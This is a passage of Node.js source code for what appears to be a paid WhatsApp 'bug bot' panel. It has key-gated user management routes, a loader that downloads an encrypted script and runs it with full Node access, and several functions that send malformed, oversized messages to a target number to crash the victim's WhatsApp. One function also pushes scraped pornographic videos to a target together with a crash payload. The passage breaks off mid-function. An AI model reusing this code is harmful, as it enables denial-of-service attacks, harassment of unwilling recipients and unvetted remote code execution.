    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

    const db = loadDatabase();
    const creator = db.find(u => u.username === keyInfo.username);

    if (!creator || creator.role !== "KINGZ") {
        console.log("[❌ USERADD] Tidak diizinkan.");
        return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
    }

    if (db.find(u => u.username === username)) {
        console.log("[❌ USERADD] Username sudah ada.");
        return res.json({ valid: true, created: false, message: "Username already exists." });
    }

    const expiredDate = createExpiryIsoWib(parseInt(day));
    if (!expiredDate) {
        return res.json({ valid: true, created: false, message: "Invalid day value." });
    }

    const newUser = {
        username,
        password,
        role: role || "member",
        expiredDate,
    };

    db.push(newUser);
    saveDatabase(db); newUser

    const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    console.log("[✅ USERADD] User berhasil dibuat:", newUser);
    return res.json({ valid: true, authorized: true, created: true, user: newUser });
});


app.get("/editUser", (req, res) => {
    const { key, username, addDays } = req.query;
    console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

    const db = loadDatabase();
    const editor = db.find(u => u.username === keyInfo.username);

    if (!editor || !["OWNER", "KINGZ"].includes(editor.role)) {
        console.log("[❌ EDIT] Tidak diizinkan.");
        return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
    }


    if (creator.role === "reseller" && parseInt(addDays) > 30) {
        console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
        return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
    }

    const targetUser = db.find(u => u.username === username);
    if (!targetUser) {
        console.log("[❌ EDIT] User tidak ditemukan.");
        return res.json({ valid: true, edited: false, message: "User not found." });
    }


    if (editor.role === "reseller" && targetUser.role !== "member") {
        console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
        return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
    }

    const nextExpiredDate = addDaysToExpiryIsoWib(targetUser.expiredDate, parseInt(addDays));
    if (!nextExpiredDate) {
        return res.json({ valid: true, edited: false, message: "Invalid day value." });
    }
    targetUser.expiredDate = nextExpiredDate;

    saveDatabase(db);
    const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
    return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});


app.get("/getLog", (req, res) => {
    const { key } = req.query;

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);

    if (!user || user.role !== "KINGZ") {
        return res.json({ valid: true, authorized: false, message: "Access denied." });
    }

    try {

        const logContent = fs.readFileSync("logUser.txt", "utf-8");
        return res.json({ valid: true, authorized: true, logs: logContent });
    } catch (err) {
        return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
    }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
    try {
        const { data } = await axios.get(url, { responseType: 'text' });
        const [ivB64, encryptedB64] = data.trim().split('.');

        const IV = Buffer.from(ivB64, 'base64');
        const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

        const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
        let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
        decrypted += decipher.final('utf8');


        const context = {
            module: { exports: {} },
            require,
            console,
            process,
            Buffer,
            setTimeout,
            setInterval,

            clearInterval,
            crypto,
            proto,
            generateWAMessageFromContent,
            prepareWAMessageMedia,
            generateWAMessageContent,
            generateWAMessage,
            waUploadToServer,
            fs,
            generateRandomMessageId
        };

        const sandbox = vm.createContext(context);
        sandbox.globalThis = sandbox;
        sandbox.exports = sandbox.module.exports;

        const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
        script.runInContext(sandbox);

        return sandbox.module.exports;
    } catch (err) {
        console.error("❌ Gagal decrypt & import:", err.stack || err.message);
        return null;
    }
}

let bugWa;

async function AxMaker2(otax, target) {
    const album = await generateWAMessageFromContent(target, {
        albumMessage: {
            expectedImageCount: 99999999,
            expectedVideoCount: 0,
        }
    }, {});

    const msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "EXTENTION_1"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options",
                        paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`,
                        version: 3
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
                        statusAttributionType: "SHARED_FROM_MENTION",
                    },
                }
            }
        }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    const msg3 = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
            mimetype: "image/webp",
            height: 9999,
            width: 9999,
            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
            fileLength: 999999,
            mediaKeyTimestamp: "1743832131",
            isAnimated: false,
            stickerSentTs: "X",
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () =>
                        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                    )
                ],
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    }
                },
                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key
                }
            }
        }
    };

    const msg4 = {
        extendedTextMessage: {
            text: "ꦾ".repeat(60000),
            contextInfo: {
                participant: target,
                mentionedJid: [
                    "support@s.whatsapp.net",
                    ...Array.from(
                        { length: 1999 },
                        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                    )
                ],
                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key
                }
            }
        }
    };

    let msg5 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: " #1stRaldzz€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "carousel_message",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "@𝗿𝗮𝗹𝗱𝘇𝘇𝘅𝘆𝘇 • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
                            newsletterJid: "120363330344810280@newsletter",
                            serverMessageId: 1
                        },
                        statusAttributionType: "SHARED_FROM_MENTION",
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1999 }, () =>
                                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                            ),
                        ]
                    }
                }
            }
        }
    }, {});

    const msg6 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "ꦾ".repeat(60000),
                    publisher: "ꦾ".repeat(60000),
                    caption: " ### ",
                    stickers: [
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🦠", "🩸"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        },
                        {
                            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                            isAnimated: false,
                            emojis: ["🩸", "🦠"],
                            accessibilityLabel: "",
                            stickerSentTs: "PnX-ID-msg",
                            isAvatar: true,
                            isAiSticker: true,
                            isLottie: true,
                            mimetype: "application/pdf"
                        }
                    ],
                    fileLength: "999999999",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
                    contextInfo: {
                        remoteJid: "X",
                        participant: "0@s.whatsapp.net",
                        stanzaId: "1234567890ABCDEF",
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1990 }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    packDescription: "",
                    mediaKeyTimestamp: "1747502082",
                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                    thumbnailHeight: 252,
                    thumbnailWidth: 252,
                    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                    stickerPackSize: "999999999",
                    stickerPackOrigin: "USER_CREATED",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "REJECTED",
                            durationSecs: "1",
                            callType: "SCHEDULED_CALL",
                            participants: [
                                { jid: target, callOutcome: "CONNECTED" },
                                { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
                                { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
                                { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                            ]
                        }
                    },
                },
            },
        },
    }, {});

    for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
        await otax.relayMessage("status@broadcast", msg.message ?? msg, {
            messageId: msg.key?.id || undefined,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
    }
}
async function crashGroupx(otax, target) {

    const options = [
        { optionName: "Ota" },
        { optionName: "otax" },
        { optionName: "otaxx" }
    ];

    const correctAnswer = options[1];

    const msg = generateWAMessageFromContent(target, {
        botInvokeMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    messageAssociation: {
                        associationType: 7,
                        parentMessageKey: crypto.randomBytes(16)
                    }
                },
                pollCreationMessage: {
                    name: "otax Here",
                    options: options,
                    selectableOptionsCount: 1,
                    pollType: "QUIZ",
                    correctAnswer: correctAnswer
                }
            }
        }
    }, {});

    if (msg && msg.key) {
        await otax.relayMessage(target, msg.message, {
            participant: { jid: target },
            messageId: msg.key.id
        });
    }
}
async function nullotax(otax, target) {
    await otax.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "IDR",
                        requestFrom: target,
                        expiryTimestamp: null,
                        noteMessage: null,
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999,
                            forwardedNewsletterMessageInfo: {
                                newsletterName: "otaxUdang",
                                newsletterJid: "1@newsletter"
                            },
                            quotedMessage: {
                                sendPaymentMessage: {
                                    noteMessage: null,
                                    requestMessageKey: undefined,
                                    background: null
                                }
                            }
                        }
                    }
                }
            }
        },
        {
            participant: { jid: target },
            messageId: null
        }
    )
}
async function packBlank(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    await otax.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                ],
                fileLength: "9999999999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
                contextInfo: {
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            creatorName: "Bot"
                        }
                    }
                },
                packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
                thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
                thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
                thumbnailHeight: 252,
                thumbnailWidth: 252,
                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
                stickerPackSize: "999999999",
                stickerPackOrigin: "1",
            },
        }, { participant: { jid: target } });
}
async function xcoreotax(otax, target, Ptcp = true) {
    await otax.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "9999999999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "×‌×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦽ".repeat(500000) + "_*~@8~*_\n".repeat(500000) + '@8'.repeat(500000),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function kresjandaotax(otax, target) {
    for (let i = 0; i < 5; i++) {
        let push = [];
        let buttt = [];

        for (let i = 0; i < 5; i++) {
            buttt.push({
                "name": "galaxy_message",
                "buttonParamsJson": JSON.stringify({
                    "header": "ꦽ".repeat(10000),
                    "body": "ꦽ".repeat(10000),
                    "flow_action": "navigate",
                    "flow_action_payload": { "screen": "FORM_SCREEN" },
                    "flow_cta": "Grattler",
                    "flow_id": "1169834181134583",
                    "flow_message_version": "3",
                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                })
            });
        }

        for (let i = 0; i < 10; i++) {
            push.push({
                "body": {
                    "text": "⌭ɪᴍ ʜᴇʀᴇ ʙʀᴏ¿?"
                },
                "header": {
                    "title": "⦸ ʟᴏɴᴛᴇ sᴘᴇᴋ ᴋᴇʀᴀs" + "ꦽ".repeat(500000),
                    "hasMediaAttachment": false,
                    "imageMessage": {
                        "url": "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                        "mimetype": "image/jpeg",
                        "fileSha256": "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                        "fileLength": 388944,
                        "height": 1600,
                        "width": 1200,
                        "mediaKey": "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                        "fileEncSha256": "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                        "directPath": "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                        "mediaKeyTimestamp": "1776937541",
                        "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
                        "contextInfo": {
                            "pairedMediaType": "NOT_PAIRED_MEDIA",
                            "isQuestion": true,
                            "isGroupStatus": true
                        }
                    }
                },
                "nativeFlowMessage": {
                    "buttons": []
                }
            });
        }

        const carousel = generateWAMessageFromContent(target, {
            "viewOnceMessage": {
                "message": {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    "interactiveMessage": {
                        "body": {
                            "text": "⩝ɪᴍ ᴀʟᴏɴᴇ" + "ꦽ".repeat(500000)
                        },
                        "footer": {
                            "text": "∅ ᴅɪʟᴀʀᴀɴɢ ᴋᴇʟᴜᴀʀ"
                        },
                        "header": {
                            "hasMediaAttachment": false
                        },
                        "carouselMessage": {
                            "cards": [
                                ...push
                            ]
                        }
                    }
                }
            }
        }, {});

        await otax.relayMessage(target, carousel.message, {
            "messageId": carousel.key.id,
            participant: { jid: target }
        });
    }
}
async function videoCrashbokep(otax, target) {
    const keywords = ["hijab", "viral", "bokep", "hot", "indonesia", "terbaru", "asmr", "cewek"];
    const keyword = keywords[Math.floor(Math.random() * keywords.length)];

    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗽𝗮𝗺 𝗕𝗼𝗸𝗲𝗽 — kata: ${keyword}`));

    const searchRes = await axios.get(
        `http://nodemanta.otax.fun:2004/search?keyword=${encodeURIComponent(keyword)}&page=0`
    );
    const results = searchRes.data?.results;
    if (!results || results.length === 0)
        throw new Error("Tidak ada hasil video sesuai keyword");

    const picks = results.slice(0, 5);
    const top = picks[Math.floor(Math.random() * picks.length)];
    if (!top) throw new Error("Gagal memilih video dari hasil pencarian");

    const dlRes = await axios.get(
        `http://nodemanta.otax.fun:2004/xndl?url=${encodeURIComponent(top.videoUrl)}`
    );
    const result = dlRes.data;
    if (!result.status) throw new Error("Gagal mengambil info video dari API");

    const videoUrl = result.files?.high || result.files?.low;
    if (!videoUrl) throw new Error("Video tidak tersedia");

    const title = top.title?.trim() || result.title?.trim() || 'Untitled';

    const sent = await otax.sendMessage(target, {
        video: { url: videoUrl },
        caption: `⎙ *${title}*`,
    });

    const rawVideoMsg = sent?.message?.videoMessage;
    if (!rawVideoMsg) throw new Error("Gagal membaca json videoBokep");

    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        videoMessage: rawVideoMsg,
                        hasMediaAttachment: true,
                    },
                    body: { text: "нαιι ιм οταϰ⸙" + "ꦽ".repeat(5000) },
                    nativeFlowMessage: {
                        messageParamsJson: "{[",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦽ".repeat(5000),
                                    flow_message_version: "3",
                                }),
                            },
                            {
                                name: "galaxy_message",
